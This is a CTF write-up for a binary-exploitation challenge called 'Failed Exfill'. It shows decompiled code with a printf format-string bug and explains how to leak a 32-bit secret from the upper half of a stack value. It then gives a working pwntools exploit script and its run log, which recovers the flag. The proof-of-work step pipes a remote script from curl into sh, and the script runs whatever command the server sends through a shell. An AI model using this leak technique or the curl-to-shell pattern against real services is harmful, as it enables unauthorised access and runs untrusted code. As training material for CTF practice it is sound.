# day 7 Failed Exfill

category : Binary exploitation

## Description

The KRAMPUS Syndicate has been using a small remote endpoint they quietly dropped on compromised NPLD machines. When they gain access to a system, they connect to this endpoint and forward whatever “precious data” they’ve collected back to their infrastructure.

During forensics analysis of the machines, analysts discovered the endpoint and later found a screenshot from a dark web forum where a Syndicate member bragged about their exfiltration method which for some reason included a copy of the server binary itself.

You’ve been given the screenshot and access to the live endpoint. See if you can identify a flaw in their server and extract the data they assumed was hidden.

Live endpoint: `nc ctf.csd.lol 7777`

This challenge's remote instance utilizes a proof-of-work verification system to prevent brute forcing and from other bad actors.

After connecting to the remote instance using `nc`, you must complete a proof-of-work challenge by running the command given and entering the output as the solution.

If you are on Windows, please download the [**solver**](https://github.com/redpwn/pow/releases/latest) manually (named `redpwnpow-windows-amd64.exe`) and run it yourself, like this in PowerShell:

```
# 'challenge' is given after connecting to nc
# (the part after '-s')
.\redpwnpow-windows-amd64.exe <challenge>

```

In any case, please review the [**auto-download script**](https://pwn.red/pow) and [**solver**](https://github.com/redpwn/pow) yourself before running untrusted code on your computer. For more protection, we recommend completing the challenge in a sandboxed environment, such as a virtual machine.

If you have any questions or concerns about this technology, please open a ticket in our [**Discord server**](https://discord.com/invite/cyberstudents-916144903686336513).

hint:

Your format string output is giving you more than you actually need. The leak is a full 64-bit stack value, but the secret the admin function checks is only a 32-bit number. Think carefully about how those two sizes line up in memory on a 64-bit system. The part you want is already inside the value you leaked.

****When you leak a pointer using `%p`, you are really printing eight bytes pulled straight from the stack. The secret code sits inside those eight bytes, just not in the position you might expect. Try isolating the upper four bytes of the leaked value, interpret them as a standalone integer, then convert them to decimal. Tools like **CyberChef** make this extraction extremely simple.
****

## Challenge Story

The KRAMPUS Syndicate left an "exfiltration endpoint" on the victim's machine. This endpoint received the stolen data and then sent it back to their server.

The researcher found a copy of the server binary (`collector`). From that binary, we had to find the bug and how to read the stolen secret. The remote system uses **Proof-of-Work** to prevent brute force attacks.

---

# Local Analysis - Binary Inspection

We found the file:

```
collector: ELF 64-bit, x86-64, dynamically linked, no PIE

```

Checksec:

```
Partial RELRO
No stack canary
NX enabled
No PIE

```

No ASLR at the executable offset, but the remote server has normal ASLR.

---

## Strings & Architecture

When executed locally:

```
./collector
If you see this on remote, contact admin

```

The program does not reveal behavior. Need to reverse.

---

# Reverse Engineering (Ghidra)

Important functions:

## `handle_write` Vulnerability

```c
void handle_write(void)
{
printf("data: ");
fgets(collected_data, 0x400, stdin);
puts("ok");
}

```

Writes user input to the global `collected_data` buffer.

---

## `handle_read` Format String Bug

```c
void handle_read(void)
{
puts("data:");
printf(collected_data);
}

```

❗ **BUG**: `printf(collected_data)` without a format specifier → FORMAT STRING VULNERABILITY.

This means that if `collected_data` contains `%p %p %p ...`, printf will read the value from the stack and print the pointer/word there.

This allows an arbitrary read of the data on the stack.

---

## `handle_admin` Secret Check

```c
void handle_admin(int param_1)
{
char local_buf[0x118];
fgets(local_buf, 0x100, stdin);
local_c = (int)strtoul(local_buf, 0, 10);
if(local_c == param_1){
puts(metadata);
} else {
puts("denied");
}
}

```

The parameter `param_1` is **32-bit secret**. If we enter the value true → server print `metadata`, which contains flags.

---

# Exploit Flow

### Program Workflow

```
cmd:
write → user sends payload → saved into collected_data
read → print collected_data using printf(collected_data)
admin → user enters 32-bit secret number

```

So we do:

1. `write` → `%p %p %p %p %p ...`
2. `read` → leak multiple pointers
3. Analyze one of the pointers that contains the secret
4. `admin` → send secret → flag exit

---

# Real Challenge: Extracting the Secret

Hint from the organizer:

> You've leaked a 64-bit stack value, but the secret is only 32-bit. Think about how 64-bit memory layout works. The upper 4 bytes of the pointer already contain the secret you're looking for.
> 

**This is the primary key**.

---

## Memory Layout Explanation (Very Important)

x86-64 (little-endian)** architecture:

### 64-bit pointer → memory layout:

Memory (low → high):

```
[ lower 4 bytes ][ upper 4 bytes ]

```

- print `%p` → display in **big-endian hex string** format

example: pointer in RAM:

```
E8 79 DD D5 52 2E 0F 50

```

Displayed as:

```
0x500f2e52d5dd79e8

```

Separate four bytes:

```
upper 4 bytes: 0x500f2e52
lower 4 bytes: 0xd5dd79e8

```

Secret = **upper 4 bytes interpreted as unsigned int**

Because:

- secret is used as a **int (32-bit)**, and **stored on the stack**,
- when the stack is used and the pointer is printed, the secret "goes" to the register/stack frame near the pointer we printed,
- so that number can appear as part of a pointer leak.

---

## Why upper, not lower?

Stack memory overlapping:

```
+-------------------+
| return addr |
| saved rbp |
| local variables |
| .... |
| int secret (4B) |
| padding (4B) |
+-------------------+

```

When `%p` reads 8 bytes from a position on the stack:

```
[ secret 4B ][ padding/some data 4B ]

```

The printed 8 bytes are interpreted as a pointer, but the first 4 bytes are actually the secret.

And this still appears even if the server uses ASLR.

---

# Live Exploitation Using Automation

### Step 1: Connect

```
nc ctf.csd.lol 7777

```

Server gives PoW:

```
Proof of work:
curl -sSfL <https://pwn.red/pow> | sh -s <challenge>

```

Solver gives `solution:` → we send it back.

---

### Step 2: Leak String Format

Command sequence:

```
cmd: write
data: %p %p %p %p %p %p %p %p %p %p %p
OK
cmd: read
data:
0x7f81d332f643 (nil) ...

```

Real run output that finds the flag:

```
0x500f2e52d5dd79e8

```

Now separate:

```
upper 32-bit = 0x500f2e52 → 1343172178 decimal
lower 32-bit = 0xd5dd79e8 → 3588061672 decimal

```

Test into `admin:`:

```
cmd: admin
auth: 1343172178

```

Server returns:

```
# KRAMPUS SYNDICATE EXFIL v1.4
...
rotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}

```

exploit script

```jsx
#!/usr/bin/env python3
from pwn import *
import subprocess
import re

HOST, PORT = "ctf.csd.lol", 7777
context.log_level = "info"

def solve_pow(pow_cmd: str) -> str:
    log.info(f"Running PoW: {pow_cmd}")
    res = subprocess.run(pow_cmd, shell=True, capture_output=True, text=True)
    out = res.stdout.strip()
    for line in out.splitlines():
        if line.startswith("solution:"):
            sol = line.split(":", 1)[1].strip()
            log.success(f"PoW solution: {sol}")
            return sol
    # Fallback: entire output is the solution
    log.success(f"PoW solution (fallback): {out}")
    return out

def split_upper_lower(ptr: str):
    h = ptr[2:].rjust(16, "0")
    upper_hex, lower_hex = h[:8], h[8:]
    return h, upper_hex, int(upper_hex, 16), lower_hex, int(lower_hex, 16)

def main():
    r = remote(HOST, PORT)

    # --- Proof of Work ---
    r.recvuntil(b"proof of work:\n")
    pow_cmd = r.recvline().decode().strip()
    log.info(f"PoW cmd: {pow_cmd}")
    r.recvuntil(b"solution:")
    sol = solve_pow(pow_cmd)
    r.sendline(sol.encode())
    r.recvuntil(b"cmd:")

    # --- Leak pointers ---
    r.sendline(b"write")
    r.recvuntil(b"data:")
    r.sendline(b"%p " * 16)
    r.recvuntil(b"ok")
    r.recvuntil(b"cmd:")

    r.sendline(b"read")
    out = r.recvuntil(b"cmd:").decode(errors="ignore")
    leak_line = next((line for line in out.splitlines() if "0x" in line), None)
    if not leak_line:
        log.error("No leak found")
        return

    ptrs = re.findall(r"0x[0-9a-fA-F]+", leak_line)
    if not ptrs:
        log.error("No pointers parsed")
        return

    print("\n[+] Leaked pointers:")
    for i, p in enumerate(ptrs):
        print(f" idx {i}: {p}")

    # --- Build candidates ---
    candidates = []
    print("\n[+] Derived candidates:")
    print("idx | pointer          | upper_hex | upper_dec | lower_hex | lower_dec")
    print("----+------------------+-----------+-----------+-----------+----------")
    for idx, p in enumerate(ptrs):
        full_h, up_h, up_d, lo_h, lo_d = split_upper_lower(p)
        print(f"{idx:3} | {p:16} | {up_h:9} | {up_d:9} | {lo_h:9} | {lo_d:9}")
        candidates.append((f"idx{idx}-upper({up_h})", up_d))
        candidates.append((f"idx{idx}-lower({lo_h})", lo_d))

    # --- Try candidates ---
    for desc, val in candidates:
        log.info(f"Trying {desc} = {val}")
        try:
            r.sendline(b"admin")
            r.recvuntil(b"auth:")
            r.sendline(str(val).encode())
            resp = r.recvuntil(b"cmd:", timeout=3).decode(errors="ignore")
        except EOFError:
            log.warning("Connection closed during attempt")
            break

        log.info(f"Response for {desc}:\n{resp}")
        if "denied" not in resp.lower():
            print("\n====== SUCCESS? ======")
            print(f"Candidate: {desc}")
            print(f"Value    : {val}")
            print("Full response:")
            print(resp)
            break

    r.close()

if __name__ == "__main__":
    main()
```

```jsx
┌──(kali㉿kali)-[~/Downloads/cyberstudent]
└─$ python3 failed-exfil.py 

[◢] Opening connection to ctf.csd.lol on port 7777: Trying 52.204.1[+] Opening connection to ctf.csd.lol on port 7777: Done
[*] PoW cmd line: curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.NmJZCB7S1zEu0cX+ZmCUuw==
[*] Running PoW: curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.NmJZCB7S1zEu0cX+ZmCUuw==
[+] PoW solution (fallback): s.YJfar2Mrb6wM0YjbNvjmYDmH36zdVzQaWhOIr2LsGwLNUqtCvG3GeY3sP/8/dSB6DEvJwVg1in1wyU1LfwxU2hFedoe799nGs9TQwx06vsK9s9UnSzYANXwOARTPkOmPrZ9IJl5Pv13Nlb2UmELfPnN3jS5dxjXjXsiIWFeHC6IrjaS6kOsyKo6JCXY38fzKNcLijRGAm2rUu9lvcFRHyA==
[*] Raw read output:
     data:
    0x7f81d332f643 (nil) 0x7f81d32475a4 0x5 (nil) 0x7ffed5dd78c0 0x40159a 0xa64616572 (nil) (nil) 0x7f81d3361af0 0x7ffed5dd79a0 0x500f2e52d5dd79e8 0x7ffed5dd7960 0x7f81d31551ca 0x7ffed5dd7910 
    cmd:
[*] Leak line: 0x7f81d332f643 (nil) 0x7f81d32475a4 0x5 (nil) 0x7ffed5dd78c0 0x40159a 0xa64616572 (nil) (nil) 0x7f81d3361af0 0x7ffed5dd79a0 0x500f2e52d5dd79e8 0x7ffed5dd7960 0x7f81d31551ca 0x7ffed5dd7910

[+] Pointers leaked:
  idx 0: 0x7f81d332f643
  idx 1: 0x7f81d32475a4
  idx 2: 0x5
  idx 3: 0x7ffed5dd78c0
  idx 4: 0x40159a
  idx 5: 0xa64616572
  idx 6: 0x7f81d3361af0
  idx 7: 0x7ffed5dd79a0
  idx 8: 0x500f2e52d5dd79e8
  idx 9: 0x7ffed5dd7960
  idx 10: 0x7f81d31551ca
  idx 11: 0x7ffed5dd7910

[+] Derived candidates (from each %p):
idx | pointer           | 64-bit hex      | upper_hex | upper_dec | lower_hex | lower_dec
----+-------------------+-----------------+-----------+-----------+-----------+----------
  0 | 0x7f81d332f643    | 00007f81d332f643 | 00007f81  |     32641 | d332f643  | 3543332419
  1 | 0x7f81d32475a4    | 00007f81d32475a4 | 00007f81  |     32641 | d32475a4  | 3542381988
  2 | 0x5               | 0000000000000005 | 00000000  |         0 | 00000005  |         5
  3 | 0x7ffed5dd78c0    | 00007ffed5dd78c0 | 00007ffe  |     32766 | d5dd78c0  | 3588061376
  4 | 0x40159a          | 000000000040159a | 00000000  |         0 | 0040159a  |   4199834
  5 | 0xa64616572       | 0000000a64616572 | 0000000a  |        10 | 64616572  | 1684104562
  6 | 0x7f81d3361af0    | 00007f81d3361af0 | 00007f81  |     32641 | d3361af0  | 3543538416
  7 | 0x7ffed5dd79a0    | 00007ffed5dd79a0 | 00007ffe  |     32766 | d5dd79a0  | 3588061600
  8 | 0x500f2e52d5dd79e8 | 500f2e52d5dd79e8 | 500f2e52  | 1343172178 | d5dd79e8  | 3588061672
  9 | 0x7ffed5dd7960    | 00007ffed5dd7960 | 00007ffe  |     32766 | d5dd7960  | 3588061536
 10 | 0x7f81d31551ca    | 00007f81d31551ca | 00007f81  |     32641 | d31551ca  | 3541389770
 11 | 0x7ffed5dd7910    | 00007ffed5dd7910 | 00007ffe  |     32766 | d5dd7910  | 3588061456
[*] Trying candidate idx0-upper(00007f81) = 32641
[*] Response for idx0-upper(00007f81):
     denied
    cmd:
[*] Trying candidate idx0-lower(d332f643) = 3543332419
[*] Response for idx0-lower(d332f643):
     denied
    cmd:
[*] Trying candidate idx1-upper(00007f81) = 32641
[*] Response for idx1-upper(00007f81):
     denied
    cmd:
[*] Trying candidate idx1-lower(d32475a4) = 3542381988
[*] Response for idx1-lower(d32475a4):
     denied
    cmd:
[*] Trying candidate idx2-upper(00000000) = 0
[*] Response for idx2-upper(00000000):
     denied
    cmd:
[*] Trying candidate idx2-lower(00000005) = 5
[*] Response for idx2-lower(00000005):
     denied
    cmd:
[*] Trying candidate idx3-upper(00007ffe) = 32766
[*] Response for idx3-upper(00007ffe):
     denied
    cmd:
[*] Trying candidate idx3-lower(d5dd78c0) = 3588061376
[*] Response for idx3-lower(d5dd78c0):
     denied
    cmd:
[*] Trying candidate idx4-upper(00000000) = 0
[*] Response for idx4-upper(00000000):
     denied
    cmd:
[*] Trying candidate idx4-lower(0040159a) = 4199834
[*] Response for idx4-lower(0040159a):
     denied
    cmd:
[*] Trying candidate idx5-upper(0000000a) = 10
[*] Response for idx5-upper(0000000a):
     denied
    cmd:
[*] Trying candidate idx5-lower(64616572) = 1684104562
[*] Response for idx5-lower(64616572):
     denied
    cmd:
[*] Trying candidate idx6-upper(00007f81) = 32641
[*] Response for idx6-upper(00007f81):
     denied
    cmd:
[*] Trying candidate idx6-lower(d3361af0) = 3543538416
[*] Response for idx6-lower(d3361af0):
     denied
    cmd:
[*] Trying candidate idx7-upper(00007ffe) = 32766
[*] Response for idx7-upper(00007ffe):
     denied
    cmd:
[*] Trying candidate idx7-lower(d5dd79a0) = 3588061600
[*] Response for idx7-lower(d5dd79a0):
     denied
    cmd:
[*] Trying candidate idx8-upper(500f2e52) = 1343172178
[*] Response for idx8-upper(500f2e52):
     # KRAMPUS SYNDICATE EXFIL v1.4
    node_id: krps-ops-node12
    channel: steady
    auth_token: a94f210033bb91ef2201df009ab1
    rotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}
    last_sync: 2025-11-29T02:11Z
    checksum: 4be2f1aa
    
    cmd:

====== POSSIBLE SUCCESS ======
Candidate : idx8-upper(500f2e52)
Value     : 1343172178
Full response:
 # KRAMPUS SYNDICATE EXFIL v1.4
node_id: krps-ops-node12
channel: steady
auth_token: a94f210033bb91ef2201df009ab1
rotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}
last_sync: 2025-11-29T02:11Z
checksum: 4be2f1aa

cmd:
[*] Closed connection to ctf.csd.lol port 7777

```

---